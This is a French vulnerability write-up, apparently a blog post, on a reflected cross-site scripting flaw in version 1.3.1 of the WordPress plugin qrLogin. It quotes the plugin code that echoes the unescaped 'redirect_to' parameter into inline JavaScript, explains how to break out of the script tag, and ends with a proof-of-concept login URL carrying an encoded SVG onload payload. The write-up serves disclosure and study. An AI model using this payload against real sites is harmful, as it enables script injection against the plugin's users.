---
title: "Cross-Site Scripting (reflected) dans le plugin Wordpress qrLogin"
tags: [vulnérabilité]
---

## Présentation du plugin

Le plugin [qrLogin](https://wordpress.org/plugins/qrlogin/) se présente de cette façon :

> qrLogin is an authentication system based on the reading of the qr code by the mobile phone and the transfer of authentication data via the http/https protocol to the application or to a web resource.
>
>The mobile application qrLogin by reading of a specially generated qr-code allows:
> * To authenticate on a web resource or in an application;
> * To subtract and save account data;
> * To subtract the credentials of the new account, generate a password or key and send these data to the server to complete the registration of this account.
>
> qrLogin is the unique thing you need to enter the web page.
> 
> To log in to the web resource, run qrLogin and scan the qr-code in the form of authentication on the web page or in the application.

La version testée est la 1.3.1 et date d'il y a 6 ans au moment de ces lignes.

## La vulnérabilité

Dans le script principal `qrlogin.php` on trouve un hook pour [login_enqueue_scripts](https://developer.wordpress.org/reference/hooks/login_enqueue_scripts/).

D'après la doc de Wordpress :

> login_enqueue_scripts is the proper hook to use when enqueuing items that are meant to appear on the login page. Despite the name, it is used for enqueuing both scripts and styles, on all login and registration related screens.

Dans le plugin la fonction appelée a le préfixe `qrl_` :

```php
//добавляем qr-код на экран логина                                                                                     
add_action( 'login_enqueue_scripts', 'qrl_login_enqueue_scripts' );
```

Cette fonction affiche du code JS. On regrettera l'absence d'utilisation de template :

```php
function qrl_login_enqueue_scripts() {
    // only for login !!!
    if ( isset( $_GET['action'] ) ) return;

    wp_enqueue_script( 'qrcode', plugins_url( 'qrcode.js', __FILE__ ), array(), '1.0' );
    wp_enqueue_script( 'jquery' );
    wp_add_inline_script( 'jquery-core', '
function qrlogin_wplogin_move_div() {
    // As there is no action hook in the right place, we have to move the div to the right place.
    var qrl_div        = document.getElementById("qrlogin_wplogin_div");
    if (qrl_div == null) return;
    var qrl_parent_div = document.getElementById("loginform");
    if (qrl_div.parentNode != qrl_parent_div ) {
        qrl_div.parentNode.removeChild(qrl_div);
        qrl_parent_div.insertBefore(qrl_div, qrl_parent_div.firstChild);
    }
}
function qrlogin_set_dots() {
    var d = document.getElementById("qrl_login_status");
    d.innerHTML = (d.innerHTML.length > 10) ? "." : d.innerHTML + ".";
}
function qrlogin_if_logged() {
    if(document.getElementById("qrlogin_qrcode").style["display"] == "none")
        return;
    qrlogin_set_dots();
    jQuery.ajax({
        url: "./qrl_ajax",
        success: function(data) {
            if(data) window.location = "' . (isset($_GET['redirect_to']) ? $_GET['redirect_to'] : (admin_url() . 'profile.php')) . '";
            else setTimeout(qrlogin_if_logged, ' . get_option( 'qrlogin_timeout' ) * 1000 . ');
        },
        error:  function(jqXHR, textStatus, errorThrown) {
            document.getElementById("qrlogin_login_error").innerHTML = errorThrown;
            qrlogin_stop_scan();
        },
    });
    --- snip ---
```

C'est surtout cette ligne qui nous intéresse :

```php
if(data) window.location = "' . (isset($_GET['redirect_to']) ? $_GET['redirect_to'] : (admin_url() . 'profile.php')) . '";
```

Le paramètre `redirect_to` ,pris de l'URL, est affiché directement.

Comme l'injection se fait dans l'affectation de la variable JS `window.location` il faut mettre en échec le code javascript pour éviter qu'une redirection ait vraiment lieu.

Pour celà, on ferme aussitôt la balise `script` sans fermer la chaine de caractères courante et on ouvre une nouvelle balise script derrière.

PoC :

```
http://localhost:8000/wp-login.php?redirect_to=%3C%2Fscript%3E%3CSvG%2FoNloAd%3Dalert%28%2FXSS%2F%29%3E&reauth=1
```
